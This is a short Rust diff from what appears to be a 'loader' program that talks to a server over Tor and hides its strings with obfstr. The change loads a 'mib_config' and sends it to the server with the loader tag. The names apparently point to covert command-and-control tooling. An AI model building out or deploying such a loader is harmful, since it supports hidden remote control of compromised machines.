@@ -4,7 +4,10 @@ use loader_vars::{
     constants::{ loader_tag, loader_version },
     types::{ receive::{ self, ClPrms, LdrRcv }, send::{ GtCnfgPrms, LdrSnd, SrvAct, SrvPrms } },
 };
-use shared::network::tor::{ LoggerCnfg, MutexPtr, RwPtr, SrvRcvTp, TrHandler };
+use shared::{
+    network::tor::{ LoggerCnfg, MutexPtr, RwPtr, SrvRcvTp, TrHandler },
+    utils::config::load_mib_config,
+};
 use obfstr::obfstr as s;
 use super::utils::run_config;
 
@@ -43,7 +46,8 @@ impl LdrTrHandler {
         ).await;
     }
     pub fn connect_callback_init(self_ref: RwPtr<Self>) {
-        let params = GtCnfgPrms { tag: loader_tag() };
+        let mib_config = load_mib_config(false).unwrap();
+        let params = GtCnfgPrms { tag: loader_tag(), mib_config };
 
         if
             let Err(_error) = Self::send_data(
